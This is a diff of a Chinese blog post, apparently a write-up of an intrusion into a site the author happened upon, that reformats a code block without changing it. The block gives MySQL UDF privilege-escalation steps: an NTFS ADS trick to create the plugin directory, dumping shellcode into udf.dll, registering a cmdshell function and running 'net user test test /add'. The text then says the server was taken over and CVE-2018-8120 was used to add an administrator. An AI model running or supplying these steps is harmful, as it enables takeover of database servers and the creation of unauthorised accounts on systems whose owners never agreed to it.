@@ -130,25 +130,8 @@
 <p><img src="/2018/09/对意外发现的某站点测试/clip_image014.jpg" alt="img"></p>
 <p>通常操作为以下步骤，但是没有写权限，有了上传权限更方便操作，直接跳过udf导出步骤：</p>
 <p>Udf需要导出到\lib\plugin目录，一般该目录不存在\lib\plugin目录。</p>
-<p>可以尝试利用NTFS ADS创建 plugin目录</p>
-<pre><code>查询 select &#39;xxx&#39; into dumpfile &#39;C:\\MySQL\\lib::$INDEX_ALLOCATION&#39;;
-
-导出UDF.DLL
-
-随便选一个库
-
-查询 CREATE TABLE Temp_udf(udf BLOB);
-
-查询 INSERT into Temp_udf values (CONVERT($shellcode,CHAR)); 
-
-查询 SELECT udf FROM Temp_udf INTO DUMPFILE &#39;C:\\MySQL\\lib\\plugin\\udf.dll&#39;;--
-
-查询 Create function cmdshell returns string soname &#39;udf.dll&#39;; 
-
-查询 select * from mysql.func;
-
-查询 select cmdshell(&#39;net user test test /add&#39;);     
-</code></pre><p>​         </p>
+<p>可以尝试利用NTFS ADS创建 plugin目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">查询 select &apos;xxx&apos; into dumpfile &apos;C:\\MySQL\\lib::$INDEX_ALLOCATION&apos;;</span><br><span class="line"></span><br><span class="line">导出UDF.DLL</span><br><span class="line"></span><br><span class="line">随便选一个库</span><br><span class="line"></span><br><span class="line">查询 CREATE TABLE Temp_udf(udf BLOB);</span><br><span class="line"></span><br><span class="line">查询 INSERT into Temp_udf values (CONVERT($shellcode,CHAR)); </span><br><span class="line"></span><br><span class="line">查询 SELECT udf FROM Temp_udf INTO DUMPFILE &apos;C:\\MySQL\\lib\\plugin\\udf.dll&apos;;--</span><br><span class="line"></span><br><span class="line">查询 Create function cmdshell returns string soname &apos;udf.dll&apos;; </span><br><span class="line"></span><br><span class="line">查询 select * from mysql.func;</span><br><span class="line"></span><br><span class="line">查询 select cmdshell(&apos;net user test test /add&apos;);</span><br></pre></td></tr></table></figure></p>
+<p>​         </p>
 <p>手动创建plugin目录，上传udf.dll文件，执行以上sql代码，创建账号，拿下服务器</p>
 <p><img src="/2018/09/对意外发现的某站点测试/clip_image018.jpg" alt="img"></p>
 <p>利用Cve-2018-8120创建账号完成添加管理员</p>
